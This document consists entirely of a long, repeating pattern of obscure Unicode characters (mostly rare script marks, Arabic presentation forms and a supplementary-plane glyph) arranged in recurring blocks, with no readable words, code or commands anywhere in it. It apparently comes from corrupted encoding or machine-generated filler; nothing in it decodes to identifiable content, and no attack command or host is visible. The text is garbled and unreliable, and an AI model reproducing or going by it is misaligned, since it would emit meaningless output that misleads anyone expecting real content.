࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬